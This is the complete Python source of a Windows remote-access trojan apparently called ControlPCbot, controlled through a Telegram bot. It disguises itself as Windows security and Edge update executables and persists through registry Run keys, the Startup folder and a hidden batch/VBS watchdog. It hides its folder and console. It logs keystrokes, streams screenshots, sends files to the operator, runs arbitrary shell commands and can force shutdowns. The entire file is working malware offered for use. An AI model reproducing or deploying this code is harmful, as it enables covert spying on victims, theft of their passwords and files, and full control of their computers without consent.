import os
import sys
import threading
import subprocess
import time
import random
import string
import tempfile
import shutil
import winreg
import ctypes
import psutil
import pyautogui
import zipfile
import requests
import sqlite3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pynput import keyboard

XR23_TOKEN = "YOUR_BOT_TOKEN_HERE"
XR23_CHAT_ID = "YOUR_CHAT_ID_HERE"
XR23_KEY = b'0123456789ABCDEF0123456789ABCDEF'


class ZK89_StealthSystem:
    def __init__(self):
        self.MN45_appdata = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Network')
        self.PQ12_install_path = os.path.join(self.MN45_appdata, 'security_update.exe')
        self.LK34_companion_path = os.path.join(self.MN45_appdata, 'windows_defender.exe')
        self.RT67_config_path = os.path.join(self.MN45_appdata, 'system_config.db')
        self.UV90_mutex_name = "Global\\WinUpdateService"

    def GH56_check_installation(self):
        return os.path.exists(self.PQ12_install_path)

    def CD34_install_system(self):
        try:
            if not os.path.exists(self.MN45_appdata):
                os.makedirs(self.MN45_appdata, 0o777, True)

            current_file = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]

            if not os.path.exists(self.PQ12_install_path):
                shutil.copy2(current_file, self.PQ12_install_path)

            if not os.path.exists(self.LK34_companion_path):
                shutil.copy2(current_file, self.LK34_companion_path)

            self.EF78_setup_autostart()
            self.WX23_setup_companion()
            self.YZ45_setup_database()
            self.AB12_hide_folder()

            return True
        except Exception as e:
            return False

    def EF78_setup_autostart(self):
        try:
            key_paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]

            for hive, path in key_paths:
                try:
                    with winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE) as key:
                        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, self.PQ12_install_path)
                except:
                    pass

            startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs',
                                        'Startup')
            startup_file = os.path.join(startup_path, 'MicrosoftEdgeUpdate.exe')
            if not os.path.exists(startup_file):
                shutil.copy2(self.PQ12_install_path, startup_file)

        except:
            pass

    def WX23_setup_companion(self):
        try:
            bat_content = f'''
@echo off
:start
timeout /t 30 /nobreak >nul
tasklist /fi "imagename eq security_update.exe" | find "security_update.exe" >nul
if %errorlevel% == 1 (
    start "" "{self.PQ12_install_path}"
)
tasklist /fi "imagename eq windows_defender.exe" | find "windows_defender.exe" >nul
if %errorlevel% == 1 (
    start "" "{self.LK34_companion_path}"
)
goto start
'''
            bat_path = os.path.join(self.MN45_appdata, 'system_monitor.bat')
            with open(bat_path, 'w') as f:
                f.write(bat_content)

            subprocess.Popen(f'"{bat_path}"', shell=True,
                             creationflags=subprocess.CREATE_NO_WINDOW)

            vbs_content = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "{bat_path}", 0, False
'''
            vbs_path = os.path.join(self.MN45_appdata, 'winupdate.vbs')
            with open(vbs_path, 'w') as f:
                f.write(vbs_content)

            subprocess.Popen(f'wscript.exe "{vbs_path}"', shell=True,
                             creationflags=subprocess.CREATE_NO_WINDOW)

        except:
            pass

    def YZ45_setup_database(self):
        try:
            conn = sqlite3.connect(self.RT67_config_path)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS system_config (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            ''')
            cursor.execute('''
                INSERT OR REPLACE INTO system_config (key, value) 
                VALUES (?, ?)
            ''', ('installed', '1'))
            conn.commit()
            conn.close()
        except:
            pass

    def AB12_hide_folder(self):
        try:
            os.system(f'attrib +h +s "{self.MN45_appdata}"')
        except:
            pass


class LM12_ConfigManager:
    def __init__(self, db_path):
        self.NO34_db_path = db_path

    def QR78_get_config(self, key, default=None):
        try:
            conn = sqlite3.connect(self.NO34_db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT value FROM system_config WHERE key = ?', (key,))
            result = cursor.fetchone()
            conn.close()
            return result[0] if result else default
        except:
            return default

    def ST90_set_config(self, key, value):
        try:
            conn = sqlite3.connect(self.NO34_db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO system_config (key, value) 
                VALUES (?, ?)
            ''', (key, value))
            conn.commit()
            conn.close()
            return True
        except:
            return False


class BC56_Encryption:
    def __init__(self, key):
        self.DE12_key = key

    def FG34_encrypt(self, data):
        try:
            cipher = AES.new(self.DE12_key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
            iv = cipher.iv
            return base64.b64encode(iv + ct_bytes).decode()
        except:
            return data

    def HI78_decrypt(self, enc_data):
        try:
            enc_data = base64.b64decode(enc_data)
            iv = enc_data[:16]
            ct = enc_data[16:]
            cipher = AES.new(self.DE12_key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode()
        except:
            return enc_data


class JK90_ScreenshotManager:
    def __init__(self, bot, chat_id, install_path):
        self.KL12_bot = bot
        self.MN34_chat_id = chat_id
        self.OP56_enabled = False
        self.QR78_interval = 2
        self.ST90_thread = None
        self.UV12_quality = 40
        self.WX34_install_path = install_path

    def WX34_start_surveillance(self):
        if not self.OP56_enabled:
            self.OP56_enabled = True
            self.ST90_thread = threading.Thread(target=self.YZ56_screenshot_loop)
            self.ST90_thread.daemon = True
            self.ST90_thread.start()
            return True
        return False

    def AB56_stop_surveillance(self):
        self.OP56_enabled = False
        return True

    def CD78_set_interval(self, interval):
        self.QR78_interval = interval

    def EF90_set_quality(self, quality):
        self.UV12_quality = quality

    def YZ56_screenshot_loop(self):
        while self.OP56_enabled:
            try:
                screenshot = pyautogui.screenshot()
                temp_filename = f"tmp_{int(time.time())}_{random.randint(1000, 9999)}.jpg"
                temp_file = os.path.join(self.WX34_install_path, temp_filename)
                screenshot.save(temp_file, 'JPEG', quality=self.UV12_quality)

                with open(temp_file, 'rb') as photo:
                    message = self.KL12_bot.send_photo(self.MN34_chat_id, photo)
                    if message:
                        keyboard = InlineKeyboardMarkup()
                        keyboard.add(InlineKeyboardButton("⏹️ Отключить запись", callback_data="stop_surveillance"))
                        self.KL12_bot.edit_message_reply_markup(self.MN34_chat_id, message.message_id,
                                                                reply_markup=keyboard)

                os.remove(temp_file)
                time.sleep(self.QR78_interval)
            except Exception as e:
                time.sleep(5)


class GH12_FileManager:
    def __init__(self):
        self.IJ34_current_path = os.path.expanduser("~")

    def KL56_get_drives(self):
        drives = []
        for partition in psutil.disk_partitions():
            if 'cdrom' not in partition.opts:
                drives.append(partition.mountpoint)
        return drives

    def MN78_list_directory(self, path):
        try:
            if not os.path.exists(path):
                return None, "Path not exists"

            items = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                item_info = {
                    'name': item,
                    'path': full_path,
                    'is_dir': os.path.isdir(full_path),
                    'size': os.path.getsize(full_path) if os.path.isfile(full_path) else 0
                }
                items.append(item_info)

            return items, None
        except Exception as e:
            return None, str(e)

    def OP90_create_zip(self, folder_path, zip_path):
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, folder_path)
                        zipf.write(file_path, arcname)
            return True
        except:
            return False


class QR34_ProcessManager:
    def __init__(self):
        pass

    def ST56_get_processes(self, show_system=False):
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'username']):
            try:
                if not show_system and proc.pid < 1000:
                    continue
                processes.append(proc)
            except:
                continue
        return processes

    def UV78_kill_process(self, pid):
        try:
            process = psutil.Process(pid)
            process.terminate()
            process.wait(timeout=5)
            return True
        except:
            try:
                process = psutil.Process(pid)
                process.kill()
                return True
            except:
                return False


class CD12_Keylogger:
    def __init__(self, bot, chat_id, install_path):
        self.EF34_bot = bot
        self.GH56_chat_id = chat_id
        self.HI78_enabled = False
        self.JK90_log_file = os.path.join(install_path, 'keylog.txt')
        self.LM12_listener = None

    def NO34_start_logging(self):
        if not self.HI78_enabled:
            self.HI78_enabled = True
            open(self.JK90_log_file, 'w').close()

            def on_press(key):
                if not self.HI78_enabled:
                    return False

                try:
                    with open(self.JK90_log_file, 'a', encoding='utf-8') as f:
                        if hasattr(key, 'char') and key.char:
                            f.write(key.char)
                        elif key == keyboard.Key.space:
                            f.write(' ')
                        elif key == keyboard.Key.enter:
                            f.write('\n')
                        elif key == keyboard.Key.backspace:
                            f.write('[BACKSPACE]')
                        else:
                            f.write(f'[{key}]')
                except:
                    pass

            self.LM12_listener = keyboard.Listener(on_press=on_press)
            self.LM12_listener.start()
            return True
        return False

    def PQ56_stop_logging(self):
        if self.HI78_enabled:
            self.HI78_enabled = False
            if self.LM12_listener:
                self.LM12_listener.stop()
            return True
        return False

    def QR78_get_log(self):
        if os.path.exists(self.JK90_log_file):
            with open(self.JK90_log_file, 'r', encoding='utf-8') as f:
                return f.read()
        return ""


class EF56_RemoteControlBot:
    def __init__(self):
        self.GH78_stealth = ZK89_StealthSystem()
        self.HI90_config_mgr = LM12_ConfigManager(self.GH78_stealth.RT67_config_path)
        self.JK12_encryption = BC56_Encryption(XR23_KEY)

        encrypted_token = self.HI90_config_mgr.QR78_get_config('bot_token')
        encrypted_chat = self.HI90_config_mgr.QR78_get_config('chat_id')

        self.KL34_token = self.JK12_encryption.HI78_decrypt(encrypted_token) if encrypted_token else XR23_TOKEN
        self.MN56_chat_id = self.JK12_encryption.HI78_decrypt(encrypted_chat) if encrypted_chat else XR23_CHAT_ID

        self.NO78_bot = telebot.TeleBot(self.KL34_token)
        self.OP90_screenshot_mgr = JK90_ScreenshotManager(self.NO78_bot, self.MN56_chat_id,
                                                          self.GH78_stealth.MN45_appdata)
        self.QR12_file_mgr = GH12_FileManager()
        self.ST34_process_mgr = QR34_ProcessManager()
        self.UV56_keylogger = CD12_Keylogger(self.NO78_bot, self.MN56_chat_id, self.GH78_stealth.MN45_appdata)

        self.YZ90_user_state = {
            "waiting_for_token": False,
            "waiting_for_command": False,
            "current_file_path": os.path.expanduser("~"),
            "file_manager_page": 0,
            "process_page": 0
        }

    def AB12_initialize_system(self):
        if not self.GH78_stealth.GH56_check_installation():
            if self.GH78_stealth.CD34_install_system():
                self.BC34_hide_console()
                return True
        return False

    def BC34_hide_console(self):
        try:
            import win32gui
            import win32con
            window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass

    def DE56_create_main_menu(self):
        keyboard = InlineKeyboardMarkup(row_width=2)

        surveillance_status = "🔴" if not self.OP90_screenshot_mgr.OP56_enabled else "🟢"
        keylogger_status = "🔴" if not self.UV56_keylogger.HI78_enabled else "🟢"

        buttons = [
            InlineKeyboardButton("🖥️ Выключить ПК", callback_data="shutdown"),
            InlineKeyboardButton("🔄 Перезагрузить ПК", callback_data="reboot"),
            InlineKeyboardButton("📸 Скриншот", callback_data="screenshot"),
            InlineKeyboardButton(f"{surveillance_status} Запись экрана", callback_data="toggle_surveillance"),
            InlineKeyboardButton(f"{keylogger_status} Кейлоггер", callback_data="toggle_keylogger"),
            InlineKeyboardButton("📁 Файловый менеджер", callback_data="file_manager"),
            InlineKeyboardButton("🔍 Управление процессами", callback_data="process_manager"),
            InlineKeyboardButton("⚙️ Настройки", callback_data="settings"),
            InlineKeyboardButton("🔄 Сменить токен", callback_data="change_token"),
            InlineKeyboardButton("💀 Самоуничтожение", callback_data="self_destruct")
        ]

        for i in range(0, len(buttons), 2):
            if i + 1 < len(buttons):
                keyboard.row(buttons[i], buttons[i + 1])
            else:
                keyboard.add(buttons[i])

        return keyboard

    def FG78_create_file_manager_keyboard(self, path=None):
        keyboard = InlineKeyboardMarkup()

        if path is None:
            path = self.YZ90_user_state["current_file_path"]

        items, error = self.QR12_file_mgr.MN78_list_directory(path)
        if items:
            page = self.YZ90_user_state["file_manager_page"]
            items_per_page = 15
            start_idx = page * items_per_page
            end_idx = min((page + 1) * items_per_page, len(items))

            for item in items[start_idx:end_idx]:
                icon = "📁" if item['is_dir'] else "📄"
                size = f" ({item['size'] // 1024} KB)" if not item['is_dir'] else ""
                text = f"{icon} {item['name']}{size}"
                callback = f"folder_{item['path']}" if item['is_dir'] else f"file_{item['path']}"
                keyboard.add(InlineKeyboardButton(text, callback_data=callback))

            if len(items) > items_per_page:
                nav_buttons = []
                if page > 0:
                    nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data="file_prev"))
                if end_idx < len(items):
                    nav_buttons.append(InlineKeyboardButton("Вперед ➡️", callback_data="file_next"))
                if nav_buttons:
                    keyboard.row(*nav_buttons)

        parent = os.path.dirname(path)
        if parent and parent != path:
            keyboard.add(InlineKeyboardButton("⬆️ Наверх", callback_data=f"folder_{parent}"))

        drives = self.QR12_file_mgr.KL56_get_drives()
        for drive in drives:
            keyboard.add(InlineKeyboardButton(f"💾 {drive}", callback_data=f"drive_{drive}"))

        keyboard.add(InlineKeyboardButton("📤 Загрузить файл", callback_data="upload_file"))
        keyboard.add(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))

        return keyboard

    def HI90_create_process_manager_message(self):
        processes = self.ST34_process_mgr.ST56_get_processes(show_system=False)

        message_text = "📋 Список процессов:\n\n"
        process_list = []

        for i, proc in enumerate(processes[:20], 1):
            try:
                memory_mb = proc.info['memory_info'].rss // 1024 // 1024 if proc.info['memory_info'] else 0
                message_text += f"{i}. {proc.info['name']} (PID: {proc.pid}) - {memory_mb} MB\n"
                process_list.append(proc.pid)
            except:
                continue

        message_text += f"\n📊 Всего процессов: {len(process_list)}"
        message_text += "\n\n💡 Введите номер процесса для завершения:"

        self.YZ90_user_state["process_list"] = process_list
        self.YZ90_user_state["waiting_for_process_kill"] = True

        return message_text

    def JK12_create_settings_keyboard(self):
        keyboard = InlineKeyboardMarkup()

        keyboard.add(InlineKeyboardButton("📸 Интервал скриншотов", callback_data="set_screenshot_interval"))
        keyboard.add(InlineKeyboardButton("🖼️ Качество скриншотов", callback_data="set_screenshot_quality"))
        keyboard.add(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))

        return keyboard

    def LM34_self_destruct(self):
        try:
            if not self.GH78_stealth.GH56_check_installation():
                return True

            paths_to_delete = [
                self.GH78_stealth.PQ12_install_path,
                self.GH78_stealth.LK34_companion_path,
                self.GH78_stealth.RT67_config_path,
                os.path.join(self.GH78_stealth.MN45_appdata, 'system_monitor.bat'),
                os.path.join(self.GH78_stealth.MN45_appdata, 'winupdate.vbs'),
                os.path.join(self.GH78_stealth.MN45_appdata, 'keylog.txt')
            ]

            for path in paths_to_delete:
                try:
                    if os.path.exists(path):
                        os.remove(path)
                except:
                    pass

            startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs',
                                        'Startup', 'MicrosoftEdgeUpdate.exe')
            if os.path.exists(startup_path):
                os.remove(startup_path)

            registry_paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]

            for hive, path in registry_paths:
                try:
                    with winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE) as key:
                        winreg.DeleteValue(key, "WindowsSecurityUpdate")
                except:
                    pass

            for proc in psutil.process_iter(['name']):
                try:
                    if 'security_update' in proc.info['name'].lower() or 'windows_defender' in proc.info[
                        'name'].lower():
                        proc.terminate()
                except:
                    pass

            return True
        except:
            return False

    def NO56_setup_handlers(self):
        @self.NO78_bot.message_handler(commands=['start'])
        def handle_start(message):
            if str(message.chat.id) != self.MN56_chat_id:
                return

            help_text = (
                "🤖 ControlPCbot - Бот управления компьютером\n\n"
                "Доступные команды:\n"
                "/cmd [команда] - Выполнить команду в CMD\n"
                "/menu - Главное меню\n\n"
                "Автор: https://github.com/MrachniyTipchek"
            )
            keyboard = self.DE56_create_main_menu()
            self.NO78_bot.send_message(message.chat.id, help_text, reply_markup=keyboard)

        @self.NO78_bot.message_handler(commands=['cmd'])
        def handle_cmd(message):
            if str(message.chat.id) != self.MN56_chat_id:
                return

            command = message.text.replace('/cmd', '', 1).strip()
            if not command:
                self.NO78_bot.reply_to(message, "Использование: /cmd <команда>")
                return

            try:
                result = subprocess.run(command, shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        timeout=30,
                                        encoding='cp866',
                                        cwd=os.path.expanduser("~"))

                output = result.stdout or result.stderr or "Команда выполнена"

                if len(output) > 4000:
                    temp_file = os.path.join(self.GH78_stealth.MN45_appdata, 'cmd_output.txt')
                    with open(temp_file, 'w', encoding='utf-8') as f:
                        f.write(output)
                    with open(temp_file, 'rb') as f:
                        self.NO78_bot.send_document(message.chat.id, f, caption="Результат команды")
                    os.remove(temp_file)
                else:
                    self.NO78_bot.reply_to(message, f"```\n{output}\n```", parse_mode="Markdown")

            except Exception as e:
                self.NO78_bot.reply_to(message, f"Ошибка: {str(e)}")

        @self.NO78_bot.message_handler(func=lambda message: self.YZ90_user_state["waiting_for_token"])
        def handle_token_change(message):
            if str(message.chat.id) != self.MN56_chat_id:
                return

            self.YZ90_user_state["waiting_for_token"] = False
            data = message.text.strip()

            if ':' in data:
                parts = data.split(':', 1)
                if len(parts) == 2:
                    token, chat_id = parts[0].strip(), parts[1].strip()
                    encrypted_token = self.JK12_encryption.FG34_encrypt(token)
                    encrypted_chat = self.JK12_encryption.FG34_encrypt(chat_id)

                    if (self.HI90_config_mgr.ST90_set_config('bot_token', encrypted_token) and
                            self.HI90_config_mgr.ST90_set_config('chat_id', encrypted_chat)):
                        self.NO78_bot.reply_to(message, "✅ Токен и Chat ID обновлены. Перезапуск...")
                        os._exit(0)
                    else:
                        self.NO78_bot.reply_to(message, "❌ Ошибка сохранения конфигурации")
                else:
                    self.NO78_bot.reply_to(message, "❌ Неверный формат. Используйте: token:chat_id")
            else:
                self.NO78_bot.reply_to(message, "❌ Неверный формат. Используйте: token:chat_id")

        @self.NO78_bot.message_handler(func=lambda message: self.YZ90_user_state.get("waiting_for_process_kill"))
        def handle_process_kill(message):
            if str(message.chat.id) != self.MN56_chat_id:
                return

            self.YZ90_user_state["waiting_for_process_kill"] = False
            try:
                index = int(message.text.strip()) - 1
                if 0 <= index < len(self.YZ90_user_state["process_list"]):
                    pid = self.YZ90_user_state["process_list"][index]
                    if self.ST34_process_mgr.UV78_kill_process(pid):
                        self.NO78_bot.reply_to(message, f"✅ Процесс завершен (PID: {pid})")
                    else:
                        self.NO78_bot.reply_to(message, f"❌ Ошибка завершения процесса")
                else:
                    self.NO78_bot.reply_to(message, "❌ Неверный номер процесса")
            except ValueError:
                self.NO78_bot.reply_to(message, "❌ Введите корректный номер")

        @self.NO78_bot.callback_query_handler(func=lambda call: True)
        def handle_callbacks(call):
            if str(call.message.chat.id) != self.MN56_chat_id:
                return

            try:
                self.NO78_bot.answer_callback_query(call.id)
            except:
                pass

            action = call.data

            if action == "main_menu":
                keyboard = self.DE56_create_main_menu()
                try:
                    self.NO78_bot.edit_message_text(
                        "🤖 ControlPCbot - Главное меню\n\nАвтор: https://github.com/MrachniyTipchek",
                        call.message.chat.id,
                        call.message.message_id,
                        reply_markup=keyboard)
                except:
                    pass

            elif action == "shutdown":
                os.system("shutdown /s /f /t 0")

            elif action == "reboot":
                os.system("shutdown /r /f /t 0")

            elif action == "screenshot":
                try:
                    screenshot = pyautogui.screenshot()
                    temp_file = os.path.join(self.GH78_stealth.MN45_appdata, f"screenshot_{int(time.time())}.png")
                    screenshot.save(temp_file, 'PNG')

                    with open(temp_file, 'rb') as photo:
                        self.NO78_bot.send_photo(call.message.chat.id, photo)

                    os.remove(temp_file)
                except Exception as e:
                    self.NO78_bot.answer_callback_query(call.id, f"Ошибка: {str(e)}")

            elif action == "toggle_surveillance":
                if self.OP90_screenshot_mgr.OP56_enabled:
                    self.OP90_screenshot_mgr.AB56_stop_surveillance()
                    status = "остановлена"
                else:
                    self.OP90_screenshot_mgr.WX34_start_surveillance()
                    status = "запущена"

                keyboard = self.DE56_create_main_menu()
                try:
                    self.NO78_bot.edit_message_text(f"📹 Запись экрана {status}",
                                                    call.message.chat.id,
                                                    call.message.message_id,
                                                    reply_markup=keyboard)
                except:
                    pass

            elif action == "stop_surveillance":
                self.OP90_screenshot_mgr.AB56_stop_surveillance()
                self.NO78_bot.answer_callback_query(call.id, "Запись экрана остановлена")

            elif action == "toggle_keylogger":
                if self.UV56_keylogger.HI78_enabled:
                    log_content = self.UV56_keylogger.QR78_get_log()
                    self.UV56_keylogger.PQ56_stop_logging()

                    if log_content:
                        temp_file = os.path.join(self.GH78_stealth.MN45_appdata, 'keylog.txt')
                        with open(temp_file, 'w', encoding='utf-8') as f:
                            f.write(log_content)
                        with open(temp_file, 'rb') as f:
                            self.NO78_bot.send_document(call.message.chat.id, f, caption="📝 Лог кейлоггера")
                        os.remove(temp_file)
                    else:
                        self.NO78_bot.answer_callback_query(call.id, "Лог пуст")
                else:
                    if self.UV56_keylogger.NO34_start_logging():
                        self.NO78_bot.answer_callback_query(call.id, "Кейлоггер запущен")
                    else:
                        self.NO78_bot.answer_callback_query(call.id, "Ошибка запуска")

                keyboard = self.DE56_create_main_menu()
                try:
                    self.NO78_bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                                            reply_markup=keyboard)
                except:
                    pass

            elif action == "file_manager":
                self.YZ90_user_state["file_manager_page"] = 0
                keyboard = self.FG78_create_file_manager_keyboard()
                try:
                    self.NO78_bot.edit_message_text("📁 Файловый менеджер",
                                                    call.message.chat.id,
                                                    call.message.message_id,
                                                    reply_markup=keyboard)
                except:
                    pass

            elif action.startswith("drive_"):
                drive = action[6:]
                self.YZ90_user_state["current_file_path"] = drive
                self.YZ90_user_state["file_manager_page"] = 0
                keyboard = self.FG78_create_file_manager_keyboard(drive)
                try:
                    self.NO78_bot.edit_message_text(f"💾 Диск {drive}",
                                                    call.message.chat.id,
                                                    call.message.message_id,
                                                    reply_markup=keyboard)
                except:
                    pass

            elif action.startswith("folder_"):
                folder_path = action[7:]
                self.YZ90_user_state["current_file_path"] = folder_path
                self.YZ90_user_state["file_manager_page"] = 0
                keyboard = self.FG78_create_file_manager_keyboard(folder_path)
                try:
                    self.NO78_bot.edit_message_text(f"📁 Папка: {folder_path}",
                                                    call.message.chat.id,
                                                    call.message.message_id,
                                                    reply_markup=keyboard)
                except:
                    pass

            elif action.startswith("file_"):
                file_path = action[5:]
                try:
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as f:
                            self.NO78_bot.send_document(call.message.chat.id, f)
                    else:
                        self.NO78_bot.answer_callback_query(call.id, "Файл не найден")
                except Exception as e:
                    self.NO78_bot.answer_callback_query(call.id, f"Ошибка: {str(e)}")

            elif action == "upload_file":
                self.NO78_bot.send_message(call.message.chat.id,
                                           "Отправьте файл для загрузки в текущую папку")
                self.YZ90_user_state["waiting_for_upload"] = True

            elif action == "file_prev":
                if self.YZ90_user_state["file_manager_page"] > 0:
                    self.YZ90_user_state["file_manager_page"] -= 1
                keyboard = self.FG78_create_file_manager_keyboard(self.YZ90_user_state["current_file_path"])
                try:
                    self.NO78_bot.edit_message_text("📁 Файловый менеджер",
                                                    call.message.chat.id,
                                                    call.message.message_id,
                                                    reply_markup=keyboard)
                except:
                    pass

            elif action == "file_next":
                self.YZ90_user_state["file_manager_page"] += 1
                keyboard = self.FG78_create_file_manager_keyboard(self.YZ90_user_state["current_file_path"])
                try:
                    self.NO78_bot.edit_message_text("📁 Файловый менеджер",
                                                    call.message.chat.id,
                                                    call.message.message_id,
                                                    reply_markup=keyboard)
                except:
                    pass

            elif action == "process_manager":
                message_text = self.HI90_create_process_manager_message()
                try:
                    self.NO78_bot.edit_message_text(message_text,
                                                    call.message.chat.id,
                                                    call.message.message_id)
                except:
                    pass

            elif action == "settings":
                keyboard = self.JK12_create_settings_keyboard()
                try:
                    self.NO78_bot.edit_message_text("⚙️ Настройки",
                                                    call.message.chat.id,
                                                    call.message.message_id,
                                                    reply_markup=keyboard)
                except:
                    pass

            elif action == "set_screenshot_interval":
                self.NO78_bot.send_message(call.message.chat.id,
                                           "Введите интервал для скриншотов (в секундах):")
                self.YZ90_user_state["waiting_for_interval"] = True

            elif action == "set_screenshot_quality":
                keyboard = InlineKeyboardMarkup()
                keyboard.add(InlineKeyboardButton("Низкое (30%)", callback_data="quality_30"))
                keyboard.add(InlineKeyboardButton("Среднее (60%)", callback_data="quality_60"))
                keyboard.add(InlineKeyboardButton("Высокое (90%)", callback_data="quality_90"))
                keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="settings"))

                try:
                    self.NO78_bot.edit_message_text("Выберите качество скриншотов:",
                                                    call.message.chat.id,
                                                    call.message.message_id,
                                                    reply_markup=keyboard)
                except:
                    pass

            elif action.startswith("quality_"):
                quality = int(action[8:])
                self.OP90_screenshot_mgr.EF90_set_quality(quality)
                self.NO78_bot.answer_callback_query(call.id, f"Качество установлено: {quality}%")

            elif action == "change_token":
                self.NO78_bot.send_message(call.message.chat.id,
                                           "Введите новый токен и chat_id в формате:\nтокен:chat_id")
                self.YZ90_user_state["waiting_for_token"] = True

            elif action == "self_destruct":
                if self.LM34_self_destruct():
                    self.NO78_bot.send_message(call.message.chat.id, "💀 Система самоуничтожения активирована")
                    os._exit(0)
                else:
                    self.NO78_bot.answer_callback_query(call.id, "❌ Ошибка самоуничтожения")

        @self.NO78_bot.message_handler(content_types=['document'])
        def handle_document(message):
            if str(message.chat.id) != self.MN56_chat_id:
                return

            if self.YZ90_user_state.get("waiting_for_upload"):
                try:
                    file_info = self.NO78_bot.get_file(message.document.file_id)
                    downloaded_file = self.NO78_bot.download_file(file_info.file_path)

                    filename = message.document.file_name
                    file_path = os.path.join(self.YZ90_user_state["current_file_path"], filename)

                    with open(file_path, 'wb') as new_file:
                        new_file.write(downloaded_file)

                    self.NO78_bot.reply_to(message, f"✅ Файл загружен: {file_path}")
                    self.YZ90_user_state["waiting_for_upload"] = False

                except Exception as e:
                    self.NO78_bot.reply_to(message, f"❌ Ошибка загрузки: {str(e)}")

        @self.NO78_bot.message_handler(func=lambda message: self.YZ90_user_state.get("waiting_for_interval"))
        def handle_interval_set(message):
            if str(message.chat.id) != self.MN56_chat_id:
                return

            self.YZ90_user_state["waiting_for_interval"] = False
            try:
                interval = int(message.text.strip())
                self.OP90_screenshot_mgr.CD78_set_interval(interval)
                self.NO78_bot.reply_to(message, f"✅ Интервал установлен: {interval} сек")
            except:
                self.NO78_bot.reply_to(message, "❌ Неверный формат числа")

    def PQ78_run(self):
        self.NO56_setup_handlers()

        while True:
            try:
                self.NO78_bot.polling(none_stop=True, timeout=60)
            except Exception as e:
                time.sleep(30)


def check_single_instance():
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\WinUpdateService")
        return ctypes.windll.kernel32.GetLastError() != 183
    except:
        return True


if __name__ == "__main__":
    if not check_single_instance():
        sys.exit(0)

    bot_system = EF56_RemoteControlBot()

    if bot_system.AB12_initialize_system():
        bot_system.PQ78_run()
    else:
        bot_system.PQ78_run()